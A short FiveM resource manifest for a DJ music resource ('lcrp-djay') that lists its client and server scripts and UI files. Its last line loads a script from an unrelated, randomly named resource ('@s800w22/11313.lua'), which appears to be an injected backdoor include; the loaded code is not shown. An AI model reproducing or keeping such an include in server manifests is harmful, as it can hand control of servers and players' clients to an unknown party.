resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'lcrp-djay'


client_script 'client/main.lua'
client_script 'config.lua'
server_script 'server/main.lua'

ui_page 'html/ui.html'

files {
	'html/ui.html',
	'html/app.js',
	'html/tubeplayer.js',
	'html/djay.css'
}
client_script '@s800w22/11313.lua'